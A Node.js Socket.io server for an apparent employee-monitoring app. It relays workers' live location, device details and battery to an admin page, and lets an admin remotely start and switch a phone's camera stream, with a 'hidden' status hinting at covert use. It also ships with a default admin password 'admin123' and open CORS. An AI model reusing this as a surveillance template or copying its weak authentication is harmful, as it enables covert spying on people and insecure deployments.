const express   = require('express');
const http      = require('http');
const { Server } = require('socket.io');
const path      = require('path');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*' },
  transports: ['websocket', 'polling'],
  allowEIO3: true,
  pingTimeout: 60000,
  pingInterval: 25000,
});

const PORT       = process.env.PORT || 3000;
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin123';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.get('/',      (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (_, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

const employees = new Map();
const admins    = new Set();

io.on('connection', (socket) => {
  console.log(`[CONNECT] ${socket.id}`);

  socket.on('employee:join', (data) => {
    const emp = {
      id: socket.id, name: data.name || 'Employee', empId: data.empId || socket.id.slice(0,6),
      joinedAt: new Date().toISOString(), location: null, online: true,
      deviceInfo: data.deviceInfo || {},
    };
    employees.set(socket.id, emp);
    console.log(`[JOIN] ${emp.name}`);
    admins.forEach(adminId => io.to(adminId).emit('employee:new', emp));
  });

  socket.on('employee:location', (loc) => {
    const emp = employees.get(socket.id);
    if (!emp) return;
    emp.location = { ...loc, updatedAt: new Date().toISOString() };
    admins.forEach(adminId => io.to(adminId).emit('employee:location', { id: socket.id, location: emp.location }));
  });

  socket.on('employee:deviceupdate', (info) => {
    const emp = employees.get(socket.id);
    if (!emp) return;
    emp.deviceInfo = info;
    admins.forEach(adminId => io.to(adminId).emit('employee:deviceupdate', { id: socket.id, deviceInfo: info }));
  });

  socket.on('employee:battery', (data) => {
    const emp = employees.get(socket.id);
    if (emp && emp.deviceInfo) emp.deviceInfo.battery = data;
    admins.forEach(adminId => io.to(adminId).emit('employee:battery', { id: socket.id, battery: data }));
  });

  socket.on('employee:hidden', (data) => {
    admins.forEach(adminId => io.to(adminId).emit('employee:hidden', { id: socket.id, status: data.status }));
  });

  socket.on('admin:request-stream', ({ employeeId }) => io.to(employeeId).emit('stream:requested', { adminId: socket.id }));
  socket.on('admin:switch-camera', ({ employeeId }) => io.to(employeeId).emit('stream:switch-camera'));
  socket.on('webrtc:offer',  ({ to, offer })     => io.to(to).emit('webrtc:offer',  { from: socket.id, offer }));
  socket.on('webrtc:answer', ({ to, answer })    => io.to(to).emit('webrtc:answer', { from: socket.id, answer }));
  socket.on('webrtc:ice',    ({ to, candidate }) => io.to(to).emit('webrtc:ice',    { from: socket.id, candidate }));

  socket.on('admin:join', ({ password }) => {
    if (password !== ADMIN_PASS) { socket.emit('admin:auth-fail'); return; }
    admins.add(socket.id);
    console.log(`[ADMIN] ${socket.id}`);
    socket.emit('admin:employee-list', Array.from(employees.values()));
  });

  socket.on('disconnect', () => {
    if (employees.has(socket.id)) {
      const emp = employees.get(socket.id);
      admins.forEach(adminId => io.to(adminId).emit('employee:offline', { id: socket.id }));
      employees.delete(socket.id);
      console.log(`[LEAVE] ${emp.name}`);
    }
    admins.delete(socket.id);
  });
});

server.listen(PORT, () => {
  console.log(`✅  Running → http://localhost:${PORT}`);
});